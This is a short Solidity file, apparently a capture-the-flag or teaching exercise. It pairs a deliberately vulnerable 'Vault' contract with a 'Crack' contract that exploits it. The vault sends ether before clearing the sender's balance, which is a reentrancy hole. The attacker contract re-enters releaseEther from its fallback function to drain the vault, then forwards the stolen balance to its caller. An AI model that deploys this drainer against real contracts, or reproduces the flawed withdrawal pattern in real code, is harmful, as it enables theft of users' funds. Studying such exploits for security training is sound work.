pragma solidity ^0.4.21;

contract Vault {
  mapping(address => uint256) balancesOfEther;
  
  function putEther() public payable {
    balancesOfEther[msg.sender] = msg.value;
  }
  
  function releaseEther() public {
    if (!msg.sender.call.value(balancesOfEther[msg.sender])()) {
      revert();
    }
    balancesOfEther[msg.sender] = 0;
  }
  
  function() {
    revert();
  }
  
  bool private contract_status;
  
  function status() external view returns (bool) {
    return contract_status;
  }
  
  function solved() private {
    contract_status = true;
  }
}

contract Crack {
  Vault public vault;
  
  function setTarget(address _target) public {
    vault = Vault(_target);
  }
  
  function crack() payable {
    vault.putEther.value(msg.value)();
    vault.releaseEther();
  }
  
  function() payable {
    if (vault.balance >= msg.value) {
      vault.releaseEther();
    }
  }
  
  function get() {
    msg.sender.transfer(this.balance);
  }
}